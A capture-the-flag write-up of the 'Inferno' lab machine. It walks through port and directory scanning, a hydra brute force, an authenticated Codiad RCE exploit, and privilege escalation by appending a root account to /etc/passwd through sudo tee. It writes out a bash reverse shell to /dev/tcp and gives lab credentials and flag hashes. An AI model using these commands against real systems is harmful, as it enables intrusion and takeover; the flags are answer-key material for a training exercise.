# Inferno

Real Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing

"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt), can you find them and become root?

Remember: in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on. (if you can)

# Locate and find local.txt

## Initial foothold

Nmap discovers 2 ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web enumeration

Gobuster discovers a hidden `/inferno` directory:

~~~
┌──(kali㉿kali)-[/data/Inferno]
└─$ gobuster dir -u http://10.10.131.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/05 14:02:55 Starting gobuster in directory enumeration mode
===============================================================
/inferno              (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 278]
                                               
===============================================================
2021/05/05 14:31:32 Finished
===============================================================
~~~

## Brute force the web authentication

Browsing this new resource requires an authentication (HTTP Basic authentication). We can assume that `admin` would be a valid user, let's try to brute force the password:

~~~
┌──(kali㉿kali)-[/data/Inferno]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.131.118 http-get /inferno
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-05 15:01:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.131.118:80/inferno
[STATUS] 1669.00 tries/min, 1669 tries in 00:01h, 14342730 to do in 143:14h, 16 active
[STATUS] 1760.33 tries/min, 5281 tries in 00:03h, 14339118 to do in 135:46h, 16 active
[STATUS] 1845.43 tries/min, 12918 tries in 00:07h, 14331481 to do in 129:26h, 16 active
[80][http-get] host: 10.10.131.118   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-05 15:09:23
~~~

Valid combination found: `admin:dante1`

## Codiad

We land to another authentication page, that accepts the same credentials as the HTTP Basic authentication.

We are now in "Codiad", an online editor.

I tried to modify PHP files and to upload PHP files, but it failed, as we don't have write privileges.

## Exploit

Searching for exploits affecting codiad reveals 3 exploits, 1 of which being an RCE.

~~~
┌──(kali㉿kali)-[/data/Inferno]
└─$ searchsploit codiad
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                           | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                               | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                              | multiple/webapps/49705.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                    
┌──(kali㉿kali)-[/data/Inferno/files]
└─$ searchsploit -m 49705
  Exploit: Codiad 2.8.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49705
     Path: /usr/share/exploitdb/exploits/multiple/webapps/49705.py
File Type: ASCII text, with CRLF line terminators

Copied to: /data/Inferno/files/49705.py
~~~

Let's start the exploit (notice that you will need to execute the 2 following commands in 2 windows: `echo 'bash -c "bash -i >/dev/tcp/10.8.50.72/4445 0>&1 2>&1"' | nc -lnvp 4444` and `nc -lnvp 4445`)

~~~                                                                                                                 
┌──(kali㉿kali)-[/data/Inferno/files]
└─$ python3 49705.py http://admin:dante1@10.10.64.51/inferno/ admin dante1 10.8.50.72 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.8.50.72/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
~~~

Now, we have a reverse shell.

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ nc -nlvp 4445            
listening on [any] 4445 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.64.51] 34558
bash: cannot set terminal process group (1005): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Inferno:/var/www/html/inferno/components/filemanager$ 
~~~

You'll notice that there is a cronjob that will log you off every minute, so you have to be quick.

## Lateral move (www-data -> dante)

Navigating through the files in `dante`'s home reveals an interesting file under `Downloads`:

~~~
www-data@Inferno:/var/www/html/inferno/components/filemanager$ cd ~/Downloads
cd ~/Downloads
www-data@Inferno:/home/dante/Downloads$ ls -la
ls -la
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11 15:22 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11 15:22 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11 15:22 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11 15:22 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoXX.docx
www-data@Inferno:/home/dante/Downloads$ cat .download.dat | xxd -r -p
cat .download.dat | xxd -r -p
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
~~~

The user credentials are revealed at the end of the file.

## User flag

At this stage, we can directly connect as `dante` through SSH using the credentials found just above.

~~~
┌──(kali㉿kali)-[/data/Inferno/files]
└─$ ssh dante@10.10.64.51                  
dante@Inferno:~$ cat local.txt 
77f6f3c544ec0811e2d1243e2e0d1835
~~~

User flag: `77f6f3c544ec0811e2d1243e2e0d1835`

# Locate and find proof.txt

Checking our privileges reveals that we can execute `tee` as `root` with `sudo` without password.

~~~
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
~~~

Let's take advantage of this to generate a privileged user:

~~~
dante@Inferno:~$ openssl passwd -1 -salt "inferno" "dante"
$1$inferno$vA66L6zp5Qks4kxIc3tvn/
dante@Inferno:~$ printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
~~~

Switch to `inferno`, our newly created privileged user:

~~~
dante@Inferno:~$ su - inferno
Password: dante
root@Inferno:~# cat /root/proof.txt 
Congrats!

You've rooted Inferno!

f332678ed0d0767d7434b8516a7c6144

mindsflee
~~~

Root flag: `f332678ed0d0767d7434b8516a7c6144`
